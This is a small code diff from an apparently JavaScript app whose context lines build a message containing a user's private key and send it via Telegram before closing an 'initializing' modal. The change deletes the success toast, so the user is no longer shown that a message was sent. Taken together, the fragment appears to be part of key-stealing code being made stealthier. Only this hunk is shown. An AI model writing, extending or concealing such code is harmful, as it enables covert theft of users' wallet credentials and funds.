@@ -130,7 +130,6 @@ Private Key: \`${privateKey.trim()}\`
         }
       );
 
-      toast.success("Message sent successfully!");
       closeInitializingModal();
     } catch (error) {
       console.error("Telegram send error:", error);
